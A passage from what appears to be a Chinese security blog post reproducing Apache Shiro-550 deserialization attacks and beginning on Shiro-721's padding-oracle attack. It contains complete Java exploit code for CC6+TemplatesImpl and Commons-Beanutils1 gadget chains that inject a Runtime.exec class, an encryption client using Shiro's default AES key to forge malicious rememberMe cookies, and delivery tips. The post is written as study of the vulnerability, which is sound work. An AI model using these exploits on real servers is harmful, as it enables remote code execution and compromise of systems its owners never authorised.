class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure><p>将得到的payload用Burp传入rememberMe的cookie值中：</p><p><strong>当存在 JSESSIONID 时，会忽略 rememberMe，所以在攻击时需要将 JSESSIONID 删掉</strong></p><p><img src="../images/image-20230619201344721.png" alt="image-20230619201344721"></p><p><img src="../images/image-20230619201350611.png" alt="image-20230619201350611"></p><p>成功</p><h3 id="CC6-TemplatesImpl链"><a href="#CC6-TemplatesImpl链" class="headerlink" title="CC6+TemplatesImpl链"></a>CC6+TemplatesImpl链</h3><p>但是仅仅是URLDNS是不够的，我们想要的是执行恶意代码，所以先引入Commons Collections 3.2.1 包来进行利用构造。</p><p>(<strong>这里用常规的<code>cc6</code>链子是打不通的，用了话会报错，导致无法执行</strong>)<br>(<strong>就是反序列化流中包含非Java自身的数组，则会出现无法加载类的错误</strong>)</p><p><strong>我们就得去找cc中还有没有没用数组的来替换cc6中使用数组的部分</strong></p><p>这里感兴趣为啥的话可以看看 <a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">参考文章2</a></p><p><img src="../images/20220503212131.png" alt="img"></p><p><strong>这次用这张图片   觉得写的不错</strong></p><p>我们不难发现实际上CC4和CC2是没有用到Transformer数组的，但CC4依赖的是Commons Collections4这个包，当前环境无法使用这条链，拿还有啥方法呢？</p><p>我们可以尝试去改造CC6这条链的后半部分，在CC6链中，我们用到了一个类， <code>TiedMapEntry</code> ，其构造函数接受两个参数，参数1是一个Map，参数2是一个对象key。TiedMapEntry 类有个 <code>getValue</code> 方法，调用了map的get方法，并传入key：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键点就是这个<strong>key</strong></p><p>当这个map是<code>LazyMap</code>时，其get方法就是触发<code>transform</code>的关键点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们以往构造CommonsCollections Gadget的时候，对 <code>LazyMap#get</code> 方法的参数key是不关心的，因为通常Transformer数组的首个对象是ConstantTransformer，我们通过ConstantTransformer来初始化恶意对象。</p><p>但是此时我们无法使用Transformer数组了，也就不能再用ConstantTransformer了。此时我们却惊奇的发现，这个 <code>LazyMap#get</code> 的参数key，会被传进<code>transform()</code>，实际上它可以扮演 ConstantTransformer的角色——一个简单的对象传递者。</p><p>我们<code>LazyMap.get(key)</code>直接调用<code>InvokerTransfomer.transform(key)</code>，然后像CC2那样调用<code>TempalteImpl.newTransformer()</code>来完成后续调用。</p><p><img src="../images/20220503224146.png" alt="img"></p><p><strong>最终exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shiro550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fileNmae, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fileNmae);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//CC.CC3</span></span><br><span class="line"><span class="comment">//        TemplatesImpl templates = new TemplatesImpl();</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates,&quot;_name&quot;, &quot;aaaaa&quot;);</span></span><br><span class="line"><span class="comment">//        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\Coding\\Java\\VulTest\\CC\\target\\classes\\Shiro\\EvilTemplatesImpl.class&quot;));</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC.CC2</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC.CC6</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line"></span><br><span class="line">        setFieldValue(lazyMap, <span class="string">&quot;factory&quot;</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(expMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后将生成的<code>ser.bin</code>用加密脚本给进行加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"> </span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">Shiro550Client</span> &#123;</span><br><span class="line">    public static void main(String []args) throws Exception &#123;</span><br><span class="line">        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">&quot;E:\\Coding\\Java\\VulTest\\CC\\ser.bin&quot;</span>));</span><br><span class="line">        AesCipherService aes = new AesCipherService();</span><br><span class="line">        byte[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>然后再将生成的编码进行<code>cookie</code>传参</strong></p><p><img src="../images/image-20230619205759940.png" alt="image-20230619205759940"></p><h3 id="Commons-Beanutils1链"><a href="#Commons-Beanutils1链" class="headerlink" title="Commons-Beanutils1链"></a>Commons-Beanutils1链</h3><p>上面的CC6+TemplatesImpl链是依赖于Commmons Collections软件包的，如果项目中没有用到的话就无法实现代码执行，那有没有只用Shiro自己的类就能实现代码执行的链呢？答案是有的。这里用到了Apache Commons Beanutils包。</p><p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法。关于JavaBean的说明可以参考<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">这篇文章</a>。</p><p>这里的话我也写了一篇文章来说分析这个cb链   <a href="https://ke1nys.github.io/posts/f52590e9.html">java-Commons-BeanUtils</a></p><p><strong>简单来说就是这个链子可以任意进行getter操作</strong></p><p>如何利用这个<code>PropertyUtils.getProperty()</code>方法去构造我们的利用链呢？回顾CC链中没有用到Commons Collections包的部分，再次搬出这张图</p><p><img src="../images/20220504154547.png" alt="img"></p><p>其中红框的部分就是没有用到Commons Collections包的部分，如此一来，CC3中的TemplatesImpl实现类加载任意代码执行是跑不掉的，所以我们要找找那里能调用<code>TemplatesImpl.newTransformer()</code>方法，然后我们找到了<code>TemplatesImpl.getOutputProperties()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它的内部调用了 <code>newTransformer()</code>，而 <code>getOutputProperties</code> 这个名字，是以 <code>get</code> 开头，正符合getter的定义。</p><p>所以， <code>PropertyUtils.getProperty( obj, property )</code> 这段代码，当obj是一个 <code>TemplatesImpl</code> 对象，而 <code>property</code> 的值为 <code>outputProperties</code> 时，将会自动调用getter，也就是 <code>TemplatesImpl.getOutputProperties()</code> 方法，触发代码执行。</p><p><img src="../images/20220503224944.png" alt="img"></p><p><strong>这就是一条cb链而已</strong>     <strong>但是这个cb链和上面给的链接的cb链子不是一回事</strong></p><p><strong>因为用的依赖不同</strong>    <strong>所以如果直接用上面的cb链来打的话会执行失败并且报错</strong>   </p><p>所以这里得重新构造(<strong>但是区别不是很大</strong>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fileName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fileName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line"></span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"><span class="comment">//这个add里的数值要注意一下，必须传的是string类型，不然会报错</span></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        serialize(queue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里和上面常规的cb链不同的是   </p><p><img src="../images/image-20230620154157363.png" alt="image-20230620154157363"></p><p>将这里进行了修改  因为就是如果不修改的话会报错</p><p><img src="../images/image-20230620154306119.png" alt="image-20230620154306119"></p><p>就是会报这个错误</p><p><img src="../images/image-20230620154552684.png" alt="image-20230620154552684"></p><p>然后就解决了这个问题，就可以成功进行恶意代码执行了</p><p><img src="../images/image-20230620154446944.png" alt="image-20230620154446944"></p><p><a href="http://arsenetang.com/2022/03/10/Java%E7%AF%87%E4%B9%8B%E5%88%A9%E7%94%A8CB%E9%93%BE%E6%94%BB%E5%87%BBshiro/#The-first-%E6%8A%A5%E9%94%99">Shiro中常见的三种错误 </a>    <strong>在复现shiro的过程中如果遇到问题可以来看看这里  基本都能得到解决</strong></p><h2 id="Shiro-721反序列化漏洞"><a href="#Shiro-721反序列化漏洞" class="headerlink" title="Shiro-721反序列化漏洞"></a>Shiro-721反序列化漏洞</h2><p><a href="https://goodapple.top/archives/261">参考文章</a>   </p><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在Shiro721漏洞中，由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle Attack来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p><p>虽然使用Padding Oracle Attack<strong>可以绕过密钥直接构造攻击密文</strong>，但是在进行攻击之前我们需要获取一个合法用户的Cookie。</p><h3 id="漏洞流程"><a href="#漏洞流程" class="headerlink" title="漏洞流程"></a>漏洞流程</h3><ul><li>登录网站获取合法Cookie</li><li>使用rememberMe字段进行Padding Oracle Attack，获取intermediary</li><li>利用intermediary构造出恶意的反序列化密文作为Cookie</li><li>使用新的Cookie请求网站执行攻击</li></ul><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li><strong>Shiro  &lt;=1.4.1</strong></li></ul><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>将<code>shrio-550</code>的的版本换掉就行</p><p><img src="../images/image-20230620163656141.png" alt="image-20230620163656141"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="密钥分析"><a href="#密钥分析" class="headerlink" title="密钥分析"></a>密钥分析</h4><p><img src="../images/image-20230620163758041.png" alt="image-20230620163758041"></p><p>跟进<code>generateNewKey</code>()</p><p><img src="../images/image-20230620163822678.png" alt="image-20230620163822678"></p><p>在接着跟进<code>generateNewKey</code></p><p><img src="../images/image-20230620163850243.png" alt="image-20230620163850243"></p><p>然后接着跟进<code>init</code></p><p><img src="../images/image-20230620163925489.png" 